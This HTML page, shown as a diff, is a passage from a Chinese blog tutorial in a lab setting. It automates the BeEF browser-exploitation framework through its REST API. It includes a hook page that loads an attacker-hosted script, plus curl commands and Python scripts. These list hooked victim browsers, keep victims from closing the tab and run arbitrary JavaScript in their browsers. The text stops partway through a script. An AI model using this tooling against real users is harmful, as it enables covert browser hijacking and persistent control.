@@ -1,0 +1,1164 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+    
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="利用BeEF REST API自动化控制僵尸主机, ssooking&#39;s blog">
+    <meta name="description" content="利用BeEF REST API自动化控制僵尸主机
+一. 前言 　　关于BeEF，不再多介绍，它的强大毋庸置疑，利用它我们可以做很多事情。最近的一些实验，需要用beef批量自动进行控制，发现网上也没有过多关于这方面内容的介绍，于是学习了一下它">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>利用BeEF REST API自动化控制僵尸主机 | ssooking&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
+
+</head>
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">ssooking's blog</span>
+                    </a>
+                </div>
+                <a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>Index</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>Tags</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>Categories</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>Archives</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>About</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">ssooking's blog</div>
+        <div class="logo-desc">
+            
+            征途漫漫，步履铿锵，无畏、无惧、无阻！
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                Index
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                Tags
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                Categories
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                Archives
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                About
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/ssooking" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+
+    <div class="social-link"><a href="https://github.com/ssooking" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="mailto:ssooking@yeah.net" class="tooltipped" target="_blank" data-tooltip="mail：ssooking@yeah.net" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+
+<a href="#!" class="tooltipped" data-tooltip="wechat: licg18238296977" data-position="top" data-delay="50">
+    <i class="fa fa-wechat"></i>
+</a>
+
+<a href="#!" class="tooltipped" data-tooltip="QQ: 1652010949" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+
+<a href="https://join.skype.com/invite/PWgoTe4YvrbH" class="tooltipped" target="_blank" data-tooltip="skype：ssooking" data-position="top" data-delay="50">
+    <i class="fa fa-skype"></i>
+</a>
+
+</div>
+</div>
+
+            </div>
+        </div>
+
+        
+        <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/ssooking" class="github-corner tooltipped hide-on-med-and-down" target="_blank" data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewbox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/>
+    </svg>
+</a>
+        
+    </nav>
+</header>
+
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        利用BeEF REST API自动化控制僵尸主机
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1,
+    #articleContent h2,
+    #articleContent h3,
+    #articleContent h4,
+    #articleContent h5,
+    #articleContent h6 {
+        padding-top: 76px;
+        margin-top: -76px;
+    }
+
+    #articleContent h1 {
+        line-height: 3.5rem;
+    }
+
+    #articleContent h2 {
+        line-height: 3.2rem;
+    }
+
+    #articleContent h3 {
+        line-height: 2.8rem;
+    }
+
+    #articleContent h4 {
+        line-height: 2.5rem;
+    }
+
+    #articleContent h5 {
+        line-height: 2.2rem;
+    }
+
+    #articleContent h6 {
+        line-height: 1.9rem;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            
+            <div class="article-tag">
+                
+                <a href="/tags/BeEF/" target="_blank">
+                    <span class="chip bg-color">BeEF</span>
+                </a>
+                
+                <a href="/tags/XSS/" target="_blank">
+                    <span class="chip bg-color">XSS</span>
+                </a>
+                
+            </div>
+            
+            <div class="post-info">
+                
+                <span class="post-cate">
+                    <i class="fa fa-bookmark fa-fw icon-category"></i>
+                    
+                    <a href="/categories/神兵利器/" class="post-category" target="_blank">
+                        神兵利器
+                    </a>
+                    
+                </span>
+                
+
+                <span class="post-date">
+                    <i class="fa fa-clock-o fa-fw"></i>2017-06-25
+                </span>
+            </div>
+        </div>
+        <hr>
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="利用BeEF-REST-API自动化控制僵尸主机"><a href="#利用BeEF-REST-API自动化控制僵尸主机" class="headerlink" title="利用BeEF REST API自动化控制僵尸主机"></a>利用BeEF REST API自动化控制僵尸主机</h1><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004610321-454563044.png" alt="img"></p>
+<h1 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h1><p> 　　关于BeEF，不再多介绍，它的强大毋庸置疑，利用它我们可以做很多事情。最近的一些实验，需要用beef批量自动进行控制，发现网上也没有过多关于这方面内容的介绍，于是学习了一下它的API，顺便练习一下python编程，这里把自己的学习内容分享下。本文涉及的一些内容可能具有一定的攻击性，请遵守国家法律，禁止用于非法用途。</p>
+<h1 id="二-通过API控制beef"><a href="#二-通过API控制beef" class="headerlink" title="二. 通过API控制beef"></a>二. 通过API控制beef</h1><p>　　BeEF从0.4.3.3,版本开始，提供了静态API接口，用户可以通过发送HTTP / JSON请求控制Beef。</p>
+<p>　　我们可以通过程序，批量自动加载执行某些beef的模块，实现比如自动维持权限，Getshell等功能。</p>
+<p>　　在后面的正文里，每一个调用模块的示例中，我都会尝试单独编写代码进行测试，最后，我会将各个部分组合起来，实现一个自动化控制的小demo。本文涉及到的所有代码你都可以在这里找到：<a href="https://github.com/ssooking/AutoBeef/" target="_blank" rel="noopener">https://github.com/ssooking/AutoBeef/</a>。进入正题，我们先启动beef。本机IP：192.168.1.133</p>
+<pre><code>默认hook js：http://192.168.1.133:3000/hook.js
+默认hook页面： http://192.168.1.133:3000/demos/basic.html
+默认管理界面：  http://192.168.1.133:3000/ui/panel
+</code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607220012715-1405193293.png" alt="img"></p>
+<p>　　当我们启动beef的时候，会自动生成一个静态API key，这个key用于身份认证，我们每次通过API进行控制时，都要添加这个参数值 。需要提到的是，如果你发现后文的API key，session等参数值发生了变化，是因为这篇文章不是一次写完的，测试时因为重新开启beef产生了变化，因此不要纠结，我们应该关注API如何调用。</p>
+<p>下面，我们可以创建一个简单的hook页面 ，如xss.html</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+　　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+　　　　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.1.133:3000/hook.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+　　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>　　我们也可以访问默认hook页面<code>http://192.168.1.133:3000/demos/basic.html</code>，为了测试，这里我使用了一台虚拟机，本机也使一个浏览器被hook。在管理面板可以看到主机已经上线。</p>
+<p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607224354918-1154401251.png" alt="img"></p>
+<p>　　在控制台，我们能够直接看到被hook的主机，并执行相关攻击模块。那么怎样通过API实现这些功能呢？下面，我们将通过实例进行介绍。在此之前，我们需要知道的是，用于处理我们的API请求的文件，主要存放于beef框架下core目录和core/api目录下，我们可以在该目录下查找并阅读相关源代码，了解功能的实现机制，使用API进行HTTP交互时，默认的交互数据类型为json。</p>
+<h2 id="获取API-Key"><a href="#获取API-Key" class="headerlink" title="获取API Key"></a>获取API Key</h2><p>/api/admin/login是用户登录接口，通过该接口登录之后，我们可以得到用于会话认证的API key</p>
+<p>我们用curl命令，使用默认的口令提交登录请求，会返回我们的key。这个功能可以被用于后文编写自动化控制脚本。</p>
+<pre class=" language-bash"><code class="language-bash">curl -H <span class="token string">"Content-Type: application/json"</span> -X POST -d <span class="token string">'{"username":"beef", "password":"beef"}'</span> http://192.168.1.133:3000/api/admin/login
+</code></pre>
+<p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607221323325-1242387563.png" alt="img"></p>
+<p>我们可以用下面这样一个简单的小脚本实现，代码也比较简单，不再多废话</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># ** Author: ssooking</span>
+
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> urllib2
+
+<span class="token keyword">def</span> <span class="token function">getauthkey</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    apiurl <span class="token operator">=</span>  host <span class="token operator">+</span> <span class="token string">"api/admin/login"</span>
+    logindata <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"beef"</span><span class="token punctuation">,</span> 
+        <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"beef"</span>
+    <span class="token punctuation">}</span>
+    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>logindata<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># 对数据进行JSON格式化编码</span>
+    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 生成页面请求的完整数据</span>
+    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 发送页面请求</span>
+    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true"># 获取服务器返回的页面信息，数据类型为str</span>
+    jsondata <span class="token operator">=</span>  json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resdata<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 把数据解析成python对象，此时返回dict数据      </span>
+    <span class="token keyword">return</span> jsondata<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>
+    <span class="token keyword">print</span> getauthkey<span class="token punctuation">(</span>host<span class="token punctuation">)</span>
+</code></pre>
+<h2 id="获取hook主机列表"><a href="#获取hook主机列表" class="headerlink" title="获取hook主机列表"></a>获取hook主机列表</h2><p>API中，我们要获取hook主机信息的api接口为：api/hooks。提交请求的格式类似于这样： api/hooks?token=xxxxx。需要的参数token的值是用于身份认证的API key。我们用curl命令发送请求，获取hook主机列表信息。</p>
+<pre class=" language-bash"><code class="language-bash">curl http://192.168.1.133:3000/api/hooks?token<span class="token operator">=</span>641640ae3ce89c4da45ee98de341f3e858f62bd3
+</code></pre>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607225240137-118168632.png" alt="img"></p>
+<p>返回了当前hook的主机情况，返回的json数据格式不太友好，作为测试，我们可以使用json代码格式化工具便于查看。</p>
+<p>这里是一个不错的在线json编辑工具：<a href="http://tool.lu/json/" target="_blank" rel="noopener">http://tool.lu/json/</a>。我们也可以直接在浏览器中访问url，但是后文涉及提交某些必要的参数时，不能使用这种方式。</p>
+<p>json代码经过格式化之后，我们可以看到，有两个主机上线。每个上线主机都有id号来表示身份。</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607232844543-319859011.png" alt="img"></p>
+<p><strong>session参数值是后面通过A{I调用执行beef模块时必须的参数，这个值你也可以在Web控制台的Cookie处找到。</strong></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170612091121353-718229824.png" alt="img"></p>
+<p>我们也可以通过脚本发送类似的请求实现这个获取这些信息，比如下面这个简单的示例代码</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token comment" spellcheck="true"># -*- coding=utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># ** Author: ssooking</span>
+
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> urllib2
+
+<span class="token keyword">def</span> <span class="token function">getHookedBrowsers</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host <span class="token operator">+</span> <span class="token string">"/api/hooks?token="</span> <span class="token operator">+</span> authkey<span class="token punctuation">)</span>
+    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    hooked <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"hooked-browsers"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"online"</span><span class="token punctuation">]</span>
+    <span class="token keyword">print</span> hooked
+    <span class="token keyword">return</span> hooked
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>
+    key <span class="token operator">=</span> <span class="token string">"e7170da7263c46d8e505ab044017707107a2ee6f"</span>
+    getHookedBrowsers<span class="token punctuation">(</span>host<span class="token punctuation">,</span>key<span class="token punctuation">)</span>
+</code></pre>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608164630215-992078805.png" alt="img"></p>
+<p><strong>如果你想知道某个被hook主机的详细信息，只要加上浏览器session值即可，它的请求格式应该是这样的</strong></p>
+<pre class=" language-bash"><code class="language-bash">/api/hooks/浏览器session会话值?token<span class="token operator">=</span>xxxxxxxxxxxxxxx
+</code></pre>
+<p>再来说说怎样调用模块，这部分功能是由/api/modules.rb控制的</p>
+<h2 id="列举可调用的模块信息"><a href="#列举可调用的模块信息" class="headerlink" title="列举可调用的模块信息"></a>列举可调用的模块信息</h2><p>我们通过/api/modules接口列举出可以调用的模块</p>
+<pre class=" language-bash"><code class="language-bash">curl http://192.168.1.133:3000/api/modules?token<span class="token operator">=</span>641640ae3ce89c4da45ee98de341f3e858f62bd3
+</code></pre>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607233317356-1198715028.png" alt="img"></p>
+<p>返回的格式不友好，我们直接在浏览器里访问</p>
+<p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607233504997-672456143.png" alt="img"></p>
+<p>我们可以发现，每一个模块都有对应的id号。我们在beef控制台里随便找一个，也可以找到这个id。但是需要注意一下，这个id号会因为你BeEF模块数目的不同有所变化，在编写代码之前你应该确认这个id号。</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607233738497-1272039407.png" alt="img"></p>
+<p> 　  <strong>如果你请求的格式像这样： /api/modules/130?token=xxxxx ， 即modules后面加上了具体的模块id号，那么可以得到这个模块的详细信息，比如需要的参数等</strong></p>
+<p>　　所以，如果想要调用某个模块，我们只需要知道这个模块的id，并且在发送请求的的时候提供该模块需要的参数即可。</p>
+<p>　　执行模块时请求的格式是这样的　/api/modules/:session/:module_id （session是被hook的浏览器会话，module_id即为beef模块的id号）</p>
+<p>　　需要注意的是，提交参数时，Content-Type必须为json类型,字符集为 UTF-8，并且请求的主体内容必须是有效的json数据，这在后文有实例。</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608101313481-884146508.png" alt="img"></p>
+<h2 id="执行BeEF模块"><a href="#执行BeEF模块" class="headerlink" title="执行BeEF模块"></a>执行BeEF模块</h2><p>　　举个调用例子。</p>
+<p>　　这里使用一个简单的权限维持模块 Confirm Close Tab。这个模块的作用是，受害者在试图关闭选项卡时会向用户显示”关闭确认”对话框，通过这种方式来增加shell的存活时间。相关功能的模块还有 Man-In-The-Browser，Create Foreground iFrame，Create Pop Under。</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608100439372-44091558.png" alt="img"></p>
+<p>我们可以看到，这个模块id为177，不需要提供其他参数，那么我们可以用curl模拟这种格式的请求来执行该模块</p>
+<pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{}'</span> http://xxxxx/api/modules/浏览器session/模块id?token<span class="token operator">=</span>xxxx
+</code></pre>
+<p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617130113978-1457039164.png" alt="img"></p>
+<p>虽然模块不需要额外的参数，但是因为请求主体必须为json格式，所以我们用 -d ‘{}’ 发送空数据。此时beef终端会有执行成功的提示。</p>
+<p>如果你没有这个参数，就会报如图中 Invalid JSON input for module ‘177’  的错误</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608155910356-911539469.png" alt="img"></p>
+<p> 在浏览器中验证，当我们点击关闭这个页面时，会弹出确认框，说明成功加载了这个模块。</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608155659825-677187987.png" alt="img"></p>
+<p>同样的，我们可以编写脚本执行该模块</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token comment" spellcheck="true"># -*- coding=utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># ** Author: ssooking</span>
+
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> urllib2
+
+<span class="token keyword">def</span> <span class="token function">sendConfirm</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> sessionId<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    postdata <span class="token operator">=</span> <span class="token string">'{}'</span>
+    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> sessionId <span class="token operator">+</span> <span class="token string">"/177?token="</span> <span class="token operator">+</span> authkey
+    <span class="token keyword">print</span> <span class="token string">"[+] URL: "</span> <span class="token operator">+</span> url
+    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> postdata<span class="token punctuation">)</span>
+    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>
+    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>
+    <span class="token keyword">print</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>
+    sessionId <span class="token operator">=</span> <span class="token string">"tdipkyoT9fqMsMwrW6oc7esUX74rnuOffhe94T4u2DFRlAjhl5CN47gFikTjccC4YPetBtYhszOqb6MU"</span>
+    key <span class="token operator">=</span> <span class="token string">"e7170da7263c46d8e505ab044017707107a2ee6f"</span>
+    sendConfirm<span class="token punctuation">(</span>host<span class="token punctuation">,</span>sessionId<span class="token punctuation">,</span>key<span class="token punctuation">)</span>
+</code></pre>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608165716747-1697948714.png" alt="img"></p>
+<p> 来一个带参数的例子，这次我使用的是Raw JavaScript模块，这个模块允许我们在目标浏览器上执行javascript代码。注意，这些javascript代码不能经过特殊编码。</p>
+<p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609150451340-776876082.png" alt="img"></p>
+<p>这个模块的id号为169，我们再来看看它需要的参数，通过下面这样的请求获取模块详细信息</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609151117465-1686660775.png" alt="img"></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155020790-1640674329.png" alt="img"></p>
+<p>需要提供的参数名为：”cmd”，参数内容是我们要执行的Javascript代码，我们可以用curl构造请求进行测试</p>
+<pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"cmd":"alert(\ssooking\);"}'</span> http://192.168.1.133:3000/api/modules/ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso/169?token<span class="token operator">=</span>dadd1be063d3a3b4339d84f5bdbbcbb25616b41d36a3b062697706d9f2d5
+</code></pre>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155422743-2018025793.png" alt="img"></p>
+<p>因为不能用多个单引号，所以我用alert(/ssooking/)代替，但是没有弹出窗口，不过我使用自己编写的脚本执行这个模块就可以成功执行</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token comment" spellcheck="true"># -*- coding=utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># ** Author: ssooking</span>
+
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> urllib2
+
+<span class="token keyword">def</span> <span class="token function">execJavascript</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> sessionId<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    payload<span class="token operator">=</span><span class="token punctuation">{</span>
+        <span class="token string">"cmd"</span><span class="token punctuation">:</span><span class="token string">"alert('Hello ssooking!');"</span>
+    <span class="token punctuation">}</span>
+    apiurl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> sessionId <span class="token operator">+</span> <span class="token string">"/169?token="</span> <span class="token operator">+</span> authkey
+    <span class="token keyword">print</span> <span class="token string">"[+] URL: "</span> <span class="token operator">+</span> apiurl
+    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> 
+    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span> 
+    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>
+    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>  
+    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                 
+    <span class="token keyword">return</span> resdata
+
